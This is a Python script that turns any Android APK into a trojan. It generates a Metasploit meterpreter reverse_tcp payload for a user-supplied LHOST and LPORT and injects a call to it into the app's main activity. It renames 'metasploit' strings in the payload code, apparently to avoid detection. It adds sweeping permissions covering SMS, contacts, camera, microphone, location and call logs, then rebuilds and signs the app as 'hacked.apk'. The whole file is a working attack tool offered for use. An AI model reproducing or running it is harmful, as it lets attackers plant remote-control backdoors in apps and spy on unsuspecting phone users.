#!/usr/bin/python3

import os

def directoryTraversal(appname, activity):
    os.system("ls -1 " + appname +"/ | grep smali > ls")

    f = open("ls","r").read()
    path = None

    for i in f.split("\n"):
        print(i)
        if os.path.isfile(appname + "/" + i + "/" + activity + ".smali"):
            path = appname + "/" + i + "/" + activity + ".smali"
            print("Found! Main activity (" + activity + ") in path: " + path)
            return path


permission = """    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-feature android:name="android.hardware.microphone"/>"""

def main():
    
    lhost = input("LHOST: ")
    lport = input("LPORT: ")
    apk = input("APK file: ")

    print("Creating payload...")
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o payload.apk".format(lhost,lport))


    os.system("apktool d -f payload.apk")
    os.system("apktool d -f " + apk)

    manifest = open(apk[:-4]+"/AndroidManifest.xml","r").read()

    line = 0

    for i in manifest.split("\n"):
        if i.find("action.MAIN") != -1:
            
            if manifest.split("\n")[line+1].find("LAUNCHER") != -1:
                break
            else:
                continue
        
        line += 1

    for i in range(1, 10):
        activity = manifest.split("\n")[line-i:line]
        if activity[0].find("activity") != -1:
            break
        
    print("MAIN ACTIVITY")
    print(activity)

    targetFile = []

    for i in activity:
        if i.find("android:name") != -1 and i.find("activity") != -1:
            x = i[i.find("android:targetActivity")::].split("\"")[1]
            targetFile.append(x.replace(".","/"))
            x = i[i.find("android:name")::].split("\"")[1]
            targetFile.append(x.replace(".","/"))
            break

    print(targetFile)

    for i in targetFile:
        path = directoryTraversal(apk[:-4], i)
        if (path != None):
            break

    if path == None:
        print("Main activity not found!")
        exit()

    f = open(path,"r").read()
    line = 0
    for i in f.split("\n"):
        if i.find(">onCreate") != -1:          
            break
        line += 1

    f = f.split("\n")
    f[line] = f[line] + "\n\n    invoke-static {p0}, Lcom/payload/stage/Payload;->start(Landroid/content/Context;)V"
    f = '\n'.join(f)

    f=open(path,"w").write(f)
    os.system("mkdir -p " + apk[:-4] + "/" + path.split("/")[1] +"/com/payload/stage/")
    os.system("sed -i -e 's/metasploit/payload/g' payload/smali/com/metasploit/stage/*")
    os.system("cp payload/smali/com/metasploit/stage/* " + apk[:-4] + "/" + path.split("/")[1] + "/com/payload/stage/")
    f=open(apk[:-4] + "/AndroidManifest.xml","r").read()
    
    line = 0

    f = f.split("\n")
    e = 0
    for a in f:
        for b in permission.split("\n"):
            if a.find(b) != -1:
                del(f[line])
                if e == 0:
                    l = line-1
                    e = 1              
        line += 1

    f[l] = f[l] + "\n" + permission
    f = '\n'.join(f)

    f = open(apk[:-4] + "/AndroidManifest.xml","w").write(f)

    os.system("apktool b " + apk[:-4]+ " -o hacked.apk")
    os.system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore madtik.keystore hacked.apk madtik")

if __name__ == "__main__":
    main()